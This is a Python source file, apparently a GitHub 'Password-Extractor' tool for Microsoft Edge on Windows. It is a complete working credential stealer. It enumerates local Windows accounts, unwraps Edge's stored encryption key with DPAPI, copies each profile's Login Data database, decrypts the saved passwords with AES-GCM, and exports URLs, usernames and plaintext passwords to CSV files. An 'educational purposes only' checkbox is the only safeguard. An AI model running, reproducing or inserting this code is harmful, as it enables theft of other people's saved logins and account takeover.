#!/usr/bin/env python3

# GNU General Public License v3.0

# Copyright (C) 2022, SOME-1HING [https://github.com/SOME-1HING]

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

import os
import sqlite3
import win32crypt
import sys
import Cryptodome.Cipher.AES as AES
import base64
import json
import subprocess
import re
import inquirer
import pandas as pd
import shutil
from glob import glob


class Edge:
    def __init__(self):

        os.system("cls")

        print("\n\n" + "=" * 50, end="")
        print(
            """      

#    ______    _              _____                                    _   _____                             _   
#   |  ____|  | |            |  __ \\                                  | | |  __ \\                           | |  
#   | |__   __| | __ _  ___  | |__) |_ _ ___ _____      _____  _ __ __| | | |  | | ___  ___ _ __ _   _ _ __ | |_ 
#   |  __| / _` |/ _` |/ _ \\ |  ___/ _` / __/ __\\ \\ /\\ / / _ \\| '__/ _` | | |  | |/ _ \\/ __| '__| | | | '_ \\| __|
#   | |___| (_| | (_| |  __/ | |  | (_| \\__ \\__ \\\\ V  V / (_) | | | (_| | | |__| |  __/ (__| |  | |_| | |_) | |_ 
#   |______\\__,_|\\__, |\\___| |_|   \\__,_|___/___/ \\_/\\_/ \\___/|_|  \\__,_| |_____/ \\___|\\___|_|   \\__, | .__/ \\__|
#                 __/ |                                                                           __/ | |        
#                |___/                                                                           |___/|_|        

"""
        )
        print("By: https://www.github.com/some-1hing")
        print(
            "https://www.github.com/some-1hing/Password-Extractor\n",
        )

        print("=" * 50, end="\n")

        input("Press Enter to continue...")

        print("=" * 50, end="\n")

        print(
            """
This is free software; see the source code for copying conditions.
There is ABSOLUTELY NO WARRANTY; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
For details, visit https://www.gnu.org/licenses/'. 
"""
        )

        print("=" * 50, end="\n\n")

        if inquirer.prompt(
            [
                inquirer.Confirm(
                    "continue",
                    message="I hereby confirm that I am using this script solely for educational purposes and not for any malicious activities.",
                )
            ]
        ) == {"continue": False}:
            sys.exit(1)

        # Select the Windows user account
        self.win_user_account = self.select_win_user_account()
        self.source_path = os.path.normpath(
            "C:\\Users\\" + self.win_user_account + "\\AppData\\Local\\Microsoft\\Edge"
        )

        # Check if the browser is installed
        if not self.check_browser():
            print("[-] Edge browser not found")
            sys.exit(1)

        # Select the user profiles
        self.user_profiles = self.select_user_profile()

        # Get the secret key
        self.secret_key = self.get_secret_key()

        # Temporarily copy the Login Data file to the Temp folder to prevent database lock
        self.make_copy()

        print("[+] Starting Decryption")

        print("=" * 50, end="\n")

        # Decrypt the passwords
        for profile in self.user_profiles:

            print("[+] Decrypting Profile: " + profile)

            df = pd.DataFrame(columns=["URL", "Username", "Password"])

            temp_path = os.path.join(
                os.getcwd(), "Temp\\Edge\\" + profile + "\\Login Data"
            )

            data = self.main(temp_path)

            for details in data:
                self.insert_row(details, df)

            self.save_csv(profile + "_" + "edge_login.csv", df)

        self.clean_up()

        print("=" * 50, end="\n")
        print("[+] Successfully Decrypted All the Password")
        print("[+] Saved to Output To: " + os.getcwd() + "\\Output\\Edge\\")

    def select_win_user_account(self) -> str:
        """Selects the Windows user account

        Returns:
            str: Windows user account
        """
        questions = [
            inquirer.List(
                "user",
                message="Select a Windows user account",
                choices=[profile["Name"] for profile in self.get_win_user_accounts()],
            )
        ]

        answers = inquirer.prompt(questions)

        if answers:
            return answers["user"]
        else:
            print("[-] No user profile selected")
            sys.exit(1)

    def get_win_user_accounts(self) -> list[dict]:
        cmd = 'Get-WmiObject Win32_UserAccount -filter "LocalAccount=True" | Select-Object Name,FullName,Disabled'

        users = subprocess.run(
            ["powershell", "-Command", cmd], capture_output=True
        ).stdout.decode()

        return self.convert_string_to_json(users)  # type: ignore

    def convert_string_to_json(self, input_string: str) -> dict:
        """Converts the string to JSON

        Args:
            input_string (str): Input string

        Returns:
            dict: JSON object
        """
        # Splitting the string into lines
        lines = input_string.strip().split("\n")

        # Extracting header and data rows
        header = re.split(r"\s{2,}", lines[0].strip())
        data = [re.split(r"\s{2,}", line.strip()) for line in lines[2:]]

        # Creating dictionary from the data
        result = [{header[i]: value for i, value in enumerate(row)} for row in data]

        # Converting to JSON
        json_output = json.dumps(result, indent=4)

        return eval(json_output)

    def check_browser(self) -> bool:
        """Checks whether the browser is installed or not

        Returns:
            bool: True if the browser is installed, False otherwise
        """
        if os.path.exists(self.source_path):
            return True
        else:
            return False

    def select_user_profile(self) -> list[str]:
        """Selects the user profile

        Returns:
            list[str]: List of user profiles
        """

        folders = self.get_profile_folders()

        if len(folders) == 1:
            print("[+] Default Profile Selected")
            return folders

        questions = [
            inquirer.List(
                "profile",
                message="Select a user profile",
                choices=[profile for profile in self.get_profile_folders()],
            )
        ]

        answers = inquirer.prompt(questions)

        if answers:
            if answers["profile"] == "All Profiles":
                profiles = self.get_profile_folders()
                profiles.remove("All Profiles")
                return profiles
            else:
                return [answers["profile"]]
        else:
            print("[-] No profile selected")
            sys.exit(1)

    def get_profile_folders(self) -> list[str]:
        """Gets the profile folders

        Returns:
            list[str]: List of profile folders
        """
        folders = []
        path = (
            "C:\\Users\\"
            + self.win_user_account
            + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\"
        )

        for dir in glob(
            path + "*\\",
            recursive=True,
        ):

            folder = os.path.normpath(dir).replace("\\", "\\").replace(path, "")

            if "Profile" == folder.split(" ")[0]:
                folders.append(folder)

        if len(folders) == 0:
            folders.append("Default")
            return folders

        folders.append("Default")
        folders.append("All Profiles")

        return folders

    def get_secret_key(self) -> bytes:
        """Gets the secret key from the Local State file

        Returns:
            bytes: Key used by Edge to encrypt the passwords
        """
        local_state = json.loads(
            open(
                os.path.join(self.source_path, "User Data\\Local State"),
                "r",
                encoding="utf-8",
            ).read()
        )

        encrypted_key = local_state["os_crypt"]["encrypted_key"]

        secret_key = base64.b64decode(encrypted_key)[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]

        return secret_key

    def make_copy(self) -> None:
        """Makes a copy of the Login Data file to the Temp folder to prevent database lock"""

        for profile in self.user_profiles:
            try:
                os.makedirs(
                    os.path.join(os.getcwd(), "Temp\\Edge\\" + profile), exist_ok=True
                )
            except Exception as e:
                print("[-] %s" % (e))
            try:
                shutil.copy(
                    os.path.join(
                        self.source_path, "User Data\\" + profile + "\\Login Data"
                    ),
                    os.path.join(
                        os.getcwd(), "Temp\\Edge\\" + profile + "\\Login Data"
                    ),
                )
            except Exception as e:
                print("[-] %s" % (e))

    def main(self, path: str) -> list[dict]:
        """Decrypts the passwords from the Login Data file

        Args:
            path (str): Path to the Login Data file

        Returns:
            list[dict]: List of decrypted user login details
        """

        # Connect to the Database
        conn = self.database_connection(path)
        cursor = conn.cursor()

        # Get the results
        try:
            cursor.execute(
                "SELECT origin_url, username_value, password_value FROM logins"
            )
        except Exception as e:
            print("[-] %s" % (e))
            sys.exit(1)

        rows = self.extract_data(cursor)

        decrypted_rows = []

        for row in rows:
            cipher_text = row[2]

            decrypted_pass = self.decrypt_password(cipher_text)

            decrypted_rows.append(
                {
                    "url": row[0],
                    "username": row[1],
                    "password": decrypted_pass,
                }
            )
        conn.close()

        return decrypted_rows

    def database_connection(self, path: str) -> sqlite3.Connection:
        """Connects to the SQLite database

        Args:
            path (str): Path to the SQLite database

        Returns:
            sqlite3.Connection: Connection object
        """
        try:
            conn = sqlite3.connect(path)
            cursor = conn.cursor()
        except Exception as e:
            print("[-] %s" % (e))
            sys.exit(1)

        return conn

    def extract_data(self, cursor: sqlite3.Cursor) -> list[dict]:
        """Extracts the data from the database

        Args:
            cursor (sqlite3.Cursor): Cursor object

        Returns:
            list[dict]: List of extracted data
        """
        try:
            cursor.execute(
                "SELECT origin_url, username_value, password_value FROM logins"
            )
        except Exception as e:
            print("[-] %s" % (e))
            sys.exit(1)

        return cursor.fetchall()

    def decrypt_password(self, cipher_text: bytes) -> str:
        """Decrypts the password

        Args:
            cipher_text (str): Encrypted password

        Returns:
            str: Decrypted password
        """
        initialization_vector = cipher_text[3:15]
        encrypted_password = cipher_text[15:-16]

        cipher = AES.new(self.secret_key, AES.MODE_GCM, initialization_vector)
        decrypted_pass = cipher.decrypt(encrypted_password)
        decrypted_pass = decrypted_pass.decode()

        return decrypted_pass

    def insert_row(self, data: dict, df: pd.DataFrame) -> None:
        """Inserts the details into the DataFrame

        Args:
            data (dict): Login details
            df (pd.DataFrame): DataFrame to insert the details
        """
        df.loc[len(df.index)] = [
            data.get("url"),
            data.get("username"),
            data.get("password"),
        ]

    def save_csv(self, file_name: str, df: pd.DataFrame) -> None:
        """Saves the DataFrame to a CSV file

        Args:
            file_name (str): File name to save the DataFrame
            df (pd.DataFrame): DataFrame to save
        """
        output_dir = os.path.join(os.getcwd(), "Output", "Edge")
        os.makedirs(output_dir, exist_ok=True)

        df.to_csv(os.path.join(output_dir, file_name), index=False)

    def clean_up(self) -> None:
        """Cleans up the Temp folder"""
        try:
            os.system("rd /q /s -rf " + os.getcwd() + "\\Temp > NUL 2>&1")
        except Exception as e:
            print("[-] %s" % (e))


# Run the script
try:
    Edge()
except KeyboardInterrupt:
    print("\n[-] Keyboard Interrupt")
    sys.exit(1)
except Exception as e:
    print("[-] %s" % (e))
    sys.exit(1)
